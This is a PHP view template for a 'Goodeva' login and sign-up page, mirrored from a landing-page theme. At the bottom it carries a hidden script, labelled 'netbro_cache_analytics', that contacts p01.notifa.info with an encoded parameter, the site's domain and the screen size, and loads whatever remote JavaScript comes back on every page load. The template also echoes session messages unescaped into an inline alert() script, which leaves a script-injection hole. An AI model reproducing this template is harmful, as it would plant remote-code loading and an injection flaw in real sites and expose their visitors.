<!DOCTYPE html>
<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
<!--[if (gte IE 9)|!(IE)]><!-->
<html lang="zxx">
<!--<![endif]-->


<!-- Mirrored from rexbd.net/html/rupa/demo/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 06 Nov 2018 09:24:15 GMT -->

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1, user-scalable=0">
    <meta name="keywords" content="">
    <meta name="description" content="">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <title>
        <?php echo $title_page;  ?>
    </title>
    <!--Favicon-->
    <link rel="shortcut icon" type="image/png" href="<?php echo base_url() ?>assets/landing/assets/images/favicon.png" />
    <!--Bootstrap CSS-->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>assets/landing/assets/css/bootstrap.css">
    <!--Owl Carousel CSS-->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>assets/landing/assets/css/owl.carousel.min.css">
    <!--Icofont CSS-->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>assets/landing/assets/css/icofont.css">
    <!--Magnific PopUp CSS-->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>assets/landing/assets/css/magnific-popup.css">
    <!--Bootsnav CSS-->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>assets/landing/assets/css/bootsnav.css">
    <!--Main CSS-->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>assets/landing/assets/css/style.css">
    <!--Responsive CSS-->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>assets/landing/assets/css/responsive.css">

    <!--Modanizr JS-->
    <script src="<?php echo base_url() ?>assets/landing/assets/js/modernizr.custom.js"></script>
    <!--[if IE]>
    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
</head>

<body>
    <!--Start Preloader-->
    <div class="site-preloader">
        <div class="spinner">
            <div class="double-bounce1"></div>
            <div class="double-bounce2"></div>
        </div>
    </div>
    <!--End Preloader-->

    <!--Start Body Wrap-->
    <div id="body-wrap">
        <!--Start Header-->
        <header id="header">
            <nav class="navbar navbar-default bootsnav" data-spy="affix" data-offset-top="10">
                <!--Start Container-->
                <div class="container">
                    <!-- Start Atribute Navigation -->
                    <div class="attr-nav">
                        <a href="#">Buy Now</a>
                    </div>
                    <!-- End Atribute Navigation -->

                    <!-- Start Header Navigation -->
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-menu">
                            <i class="icofont icofont-navigation-menu"></i>
                        </button>
                        <a class="navbar-brand" href="index.html"><img src="<?php echo base_url() ?>assets/landing/assets/images/logo.png" class="logo" alt=""></a>
                    </div>
                    <!-- End Header Navigation -->

                    <!-- Collect the nav links, forms, and other content for toggling -->
                    <div class="collapse navbar-collapse" id="navbar-menu">
                        <ul class="nav navbar-nav navbar-right" data-in="fadeIn" data-out="fadeOut">
                            <li class="active"><a href="#header">Home</a></li>
                            <li><a href="#about-area">About</a></li>
                            <li><a href="#features-area">Features</a></li>
                            <li><a href="#product-area">Product</a></li>
                            <li><a href="#testimonial-area">Testimonial</a></li>
                            <li><a href="#faq-area">FAQ</a></li>
                            <li><a href="#contact-area">Contact</a></li>
                        </ul>
                    </div>
                    <!-- /.navbar-collapse -->
                </div>
                <!--End Container-->
            </nav>
            <div class="clearfix"></div>
        </header>
        <!--End Header-->
        <?php 
    
        if($this->session->flashdata('pesan'))
        {
        $cek=$this->session->flashdata('pesan');
        echo "<script>alert('$cek');</script>";
        } 
        
        
         if($this->session->flashdata('pesan-login'))
        {
        $cek2=$this->session->flashdata('pesan-login');
        echo "<script>alert('$cek2');</script>";
             
        } ?>

        <?php if($get=='register'){ ?>

        <section id="contact-area">
            <!--Start Container-->
            <div class="container">
                <!--Start Heading Row-->
                <div class="row">
                    <div class="col-md-6 col-md-offset-3">
                        <div class="section-heading text-center">
                            <h2>Sign Up</h2>
                            <h3>Already have a Goodeva account? <a href="?"><u>Log In</u></a></h3>
                        </div>
                    </div>
                </div>
                <!--End Heading Row-->

                <!--Start Contact Row-->
                <div class="row">
                    <!--Start Contact Form-->
                    <div class="col-md-6 col-md-offset-1 col-sm-8" style="border-right: 1px solid;">
                        <div class="contact-form">
                            <form action="<?php echo base_url(); ?>User-login/register" method="post">
                                <div class="form-group">
                                    <input type="text" class="form-control" name="nama" placeholder="Name">
                                </div>
                                <div class="form-group">
                                    <input type="email" class="form-control" name="email" placeholder="Email">
                                </div>

                                <div class="form-group">
                                    <input type="password" class="form-control" name="password" placeholder="Password">
                                </div>
                                <div class="form-group">
                                    <a class="pull-right" href="">Forgot Password?</a>
                                </div>

                                <button type="submit">Submit</button>
                            </form>
                        </div>
                    </div>
                    <!--End Contact Form-->

                    <!--Start Contact Info-->
                    <div class="col-md-5 col-sm-4">
                        <div class="contact-info">


                            <div class="btn-group" style="color: white; margin-top: 20px;width: 100%;">

                                <a class="btn btn-danger" href="" style="width: 100%;padding: 15px;">
                                    <i class="fa fa-google-plus disabled pull-left" style="width:16px; height:20px;font-size: 20px;">
                                    </i>Sign in with Google
                                </a>
                            </div>

                        </div>
                    </div>
                    <!--End Contact Info-->
                </div>
                <!--End Contact Row-->
            </div>
            <!--End Container-->
        </section>

        <?php } else { ?>
        <!--Start Contact Area-->
        <section id="contact-area">
            <!--Start Container-->
            <div class="container">
                <!--Start Heading Row-->
                <div class="row">
                    <div class="col-md-6 col-md-offset-3">
                        <div class="section-heading text-center">
                            <h2>Log In</h2>
                            <h3>New to Goodeva? <a href="?p=register"><u>Sign Up</u></a></h3>

                        </div>
                    </div>
                </div>
                <!--End Heading Row-->

                <!--Start Contact Row-->
                <div class="row">
                    <!--Start Contact Form-->
                    <div class="col-md-6 col-md-offset-1 col-sm-8" style="border-right: 1px solid;">
                        <div class="contact-form">
                            <form action="<?php echo base_url(); ?>user-login/login" method="post">
                                <div class="form-group">
                                    <input type="text" class="form-control" name="username" placeholder="username">
                                </div>

                                <div class="form-group">
                                    <input type="password" class="form-control" name="password" placeholder="Password">
                                </div>
                                <div class="form-group">
                                    <a class="pull-right" href="">Forgot Password?</a>
                                </div>

                                <button type="submit">Submit</button>
                            </form>
                        </div>
                    </div>
                    <!--End Contact Form-->

                    <!--Start Contact Info-->
                    <div class="col-md-5 col-sm-4">
                        <div class="contact-info">


                            <div class="btn-group" style="color: white; margin-top: 20px;width: 100%;">

                                <a class="btn btn-danger" href="" style="width: 100%;padding: 15px;">
                                    <i class="fa fa-google-plus disabled pull-left" style="width:16px; height:20px;font-size: 20px;">
                                    </i>Sign in with Google
                                </a>
                            </div>

                        </div>
                    </div>
                    <!--End Contact Info-->
                </div>
                <!--End Contact Row-->
            </div>
            <!--End Container-->
        </section>
        <!--End Contact Area-->
        <?php } ?>
        <!--Start Footer-->
        <!--  <footer id="footer" class="bg-gray">
            <div class="container">
                <p class="text-center">&copy; Copy 2018 All Rights Reserved</p>
            </div>
        </footer>-->
        <!--End Footer-->
    </div>
    <!--End Body Wrap-->

    <!--jQuery JS-->
    <script src="<?php echo base_url() ?>assets/landing/assets/js/jquery.min.js"></script>
    <!--Bootstrap JS-->
    <script src="<?php echo base_url() ?>assets/landing/assets/js/bootstrap.min.js"></script>
    <!--Owl Carousel JS-->
    <script src="<?php echo base_url() ?>assets/landing/assets/js/owl.carousel.min.js"></script>
    <!--Magnific PopoUp JS-->
    <script src="<?php echo base_url() ?>assets/landing/assets/js/magnific-popup.min.js"></script>
    <!--Bootsnav JS-->
    <script src="<?php echo base_url() ?>assets/landing/assets/js/bootsnav.js"></script>
    <!--Main JS-->
    <script src="<?php echo base_url() ?>assets/landing/assets/js/custom.js"></script>

    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bd%2fMoK8s1m2gOg21YRKLVZZ5oWCkb8Izo2XRVePtm5hvsTuG5FkM0VvU0NBWTNWCaLXPtSZp2khvHlJaM6TAWyip3xc1o3nm9hKWmFAFnbMYUQSpW4VECfC%2bGaOcyAFWkMCjtoHURduwmc5n6QYpya3uozo1qMSLXnYMJP9YvIPYVzuw5ou4yy93uSIWGHJYT502Hb2IN2zfWuFexcojxvTZsRINoHVOBzcEMOGUSazZjsiV0ZzGBSb6gm%2brEj7M6%2b%2btosQ2%2bIrrpOIT9gvAU6nmvyYfjg88ryOjISKR%2fQv53pd4nIfTagYs2NK%2b6wgedWyljFihRSG3oMW88jBnoA9QQmlgwH%2bkMJWTOb8mYy4jsc6pM7xTXqnCouzKiucL02NaG1NV%2fJgsQ4bkyU7ckNYuIm%2fStw8%2bfAjWIKZvIw1tGIhCg9SHurMJ0WmTXqlpAJmTI%2buSCdxR3NaRYjjJch6w%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</body>


<!-- Mirrored from rexbd.net/html/rupa/demo/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 06 Nov 2018 09:24:15 GMT -->

</html>